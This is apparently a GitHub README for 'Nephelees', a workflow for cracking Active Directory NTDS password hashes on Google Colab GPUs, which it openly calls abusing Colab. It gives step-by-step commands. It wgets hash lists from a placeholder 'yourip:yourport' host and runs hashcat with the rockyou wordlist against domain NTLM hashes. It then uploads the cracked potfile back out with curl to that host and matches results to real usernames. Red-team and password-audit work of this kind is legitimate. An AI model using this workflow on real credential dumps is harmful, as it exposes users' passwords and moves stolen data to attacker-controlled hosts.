# Nephelees
Néphélées (Νεφήλαι, Nephḗlai) : cloud nymphs greek - also ntds cracking tool abusing Google Colab 

<p align="center">
  <a href="https://colab.research.google.com/github/swisskyrepo/Nephelees/blob/main/google_colab_hashcat.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>
</p>

## V1 - Google Colab

Roll for Tesla P100

* https://github.com/ShutdownRepo/hashonymize
* https://github.com/ShutdownRepo/google-colab-hashcat
* https://github.com/mxrch/penglab

```ps1
Go on : https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ipynb
Select "Runtime", "Change runtime type", and set "Hardware accelerator" to GPU.
Change the config by setting "True" at tools you want to install.
Select "Runtime" and "Run all" !


Workflow example 3 (OPSEC: crack anonymized hashes)
run the preparation script below
on your local machine, run hashonymize to anonymize your hash lists
upload your anon hashes list on the colab !wget http://yourip:yourport/yourfile
run a hashcat command like this to start cracking !hashcat --status --hash-type 1000 --attack-mode 0 --username DOMAIN.LOCAL.ntds wordlists/rockyou.txt
recover the .pot file from the Google Colab !curl --upload-file ~/.hashcat/hashcat.potfile http://yourip:yourport/
on your local machine, run the following hashcat command with the recovered potfile to match real usernames with cracked password hashcat --potfile-path hashcat.potfile --hash-type 1000 --username DOMAIN.LOCAL.ntds wordlists/rockyou.txt
hashcat -m 1000 --potfile-path ntds.cracked ntds.tocrack --show --username
```

* markov, keyboard walking, dico + rules , haveibeenpwn
* reuse old pot (extract passwd to new wordlist) 

## V2 - UI

* https://github.com/Coalfire-Research/npk
* https://github.com/s3inlc/hashtopolis/releases/tag/v0.12.0

## References & Ideas

* https://github.com/carlmon/Hashcat-Azure
* https://durdle.com/2017/04/23/using-hashcat-to-crack-hashes-on-azure/
* https://www.trillsecurity.com/tutorials/automating-hashtopolis-with-terraform-part-i/
* https://www.trillsecurity.com/tutorials/automating-hashtopolis-with-terraform-part-ii/
